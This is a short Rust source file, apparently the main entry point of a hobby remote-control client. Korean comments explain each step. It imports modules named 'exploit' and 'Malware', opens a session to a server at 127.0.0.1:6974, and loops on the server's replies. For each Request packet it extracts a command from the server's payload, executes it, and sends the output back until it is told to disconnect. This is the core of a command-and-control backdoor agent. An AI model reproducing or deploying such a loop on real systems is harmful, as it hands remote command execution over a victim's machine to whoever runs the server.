
mod exploit;
mod structure;
mod stprotocol;


use exploit::{Malware, Exploits };
use structure:: {StructStone, StructStonePayload, StoneTransferProtocol, Detector, Generator};
use stprotocol::{ Session, Client };

fn main() {
    let mut client = Session::new("127.0.0.1:6974".to_string()); //서버와의 통신을 위한 세션 생성 (서버로 연결요청 전송)
    let mut packet = StructStone::default();

    loop { // 새션 생성후 서버와 지속적인 통신을 위한 루프문

        packet = client.receiving(StructStone::default());// 연결요청후 서버의 응답 대기

        match packet.header_type() { // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
            StoneTransferProtocol::Request => { // 타입이 Request 일 경우
                let ex = Exploits::from(packet.payload).exe_command(); // 서버가 응답한 페이로드의 명령어를 추출하여 실행
                packet = StructStonePayload::from_ex(ex).to_stone(); // 클라이언트 응답을 생성
                client.send(packet.stone) // 생성한 응답을 전송
            },
            StoneTransferProtocol::Disconnect => { client.disconnect(); break }, // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다
            _ => client.send(packet.stone) //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
        };
    }
}
